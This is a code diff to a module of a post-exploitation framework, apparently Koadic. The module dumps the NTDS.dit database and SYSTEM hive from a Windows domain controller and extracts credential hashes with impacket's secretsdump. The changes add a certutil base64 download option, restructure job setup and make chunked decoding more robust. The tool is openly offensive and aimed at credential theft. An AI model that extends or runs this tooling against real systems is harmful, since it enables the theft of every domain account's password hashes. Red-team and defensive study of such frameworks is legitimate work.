@@ -17,13 +17,14 @@ class HashDumpDCImplant(core.implant.Implant):
 
         self.options.register("NTDSFILE", "", "random uuid for NTDS file name", hidden=True)
         self.options.register("SYSHFILE", "", "random uuid for SYSTEM hive file name", hidden=True)
+        self.options.register("CERTUTIL", "false", "use certutil to base64 encode the file before downloading", required=True, boolean=True)
 
     def job(self):
         return HashDumpDCJob
 
     def run(self):
-
         import os.path
+        import os
         if not os.path.isfile("data/impacket/examples/secretsdump.py"):
             old_prompt = self.shell.prompt
             old_clean_prompt = self.shell.clean_prompt
@@ -35,6 +36,10 @@ class HashDumpDCImplant(core.implant.Implant):
                 import readline
                 readline.set_completer(None)
                 option = self.shell.get_command(self.shell.prompt)
+
+                if self.shell.spool:
+                    self.shell.spool_log(self.shell.clean_prompt, option)
+
                 if option.lower() == "y":
                     from subprocess import call
                     call(["git", "submodule", "init"])
@@ -46,17 +51,16 @@ class HashDumpDCImplant(core.implant.Implant):
                 self.shell.prompt = old_prompt
                 self.shell.clean_prompt = old_clean_prompt
 
-        # generate new file every time this is run
-        self.options.set("NTDSFILE", uuid.uuid4().hex)
-        self.options.set("SYSHFILE", uuid.uuid4().hex)
-        self.options.set("RPATH", self.options.get('RPATH').replace("\\", "\\\\").replace('"', '\\"'))
-
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/gather/hashdump_dc.js", self.options)
+        payloads["js"] = "data/implant/gather/hashdump_dc.js"
 
         self.dispatch(payloads, self.job)
 
 class HashDumpDCJob(core.job.Job):
+    def create(self):
+        self.options.set("NTDSFILE", uuid.uuid4().hex)
+        self.options.set("SYSHFILE", uuid.uuid4().hex)
+        self.options.set("RPATH", self.options.get('RPATH').replace("\\", "\\\\").replace('"', '\\"'))
 
     def save_file(self, data, name, encoder, decode = True):
         import uuid
@@ -70,11 +74,20 @@ class HashDumpDCJob(core.job.Job):
         while i < len(data):
             with open(save_fname+str(i), "wb") as f:
                 partfiles.append(save_fname+str(i))
+                end = i+step
+                if end > len(data):
+                    end = len(data)
                 pdata = data
                 if decode:
-                    pdata = self.decode_downloaded_data(pdata[i:i+step], encoder)
+                    while True:
+                        try:
+                            pdata = self.decode_downloaded_data(pdata[i:end], encoder)
+                        except:
+                            end -= 1
+                            continue
+                        break
                 f.write(pdata)
-            i += step
+            i = end
 
         with open(save_fname, "wb+") as f:
             for p in partfiles:
@@ -124,7 +137,7 @@ class HashDumpDCJob(core.job.Job):
         p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True, env={"PYTHONPATH": "./data/impacket"})
         output = p.stdout.read()
         #self.shell.print_plain(output.decode())
-        self.dump_file = self.save_file(output, 'DCDUMP', False)
+        self.dump_file = self.save_file(output, 'DCDUMP', 0, False)
         super(HashDumpDCJob, self).report(None, "", False)
 
     def done(self):
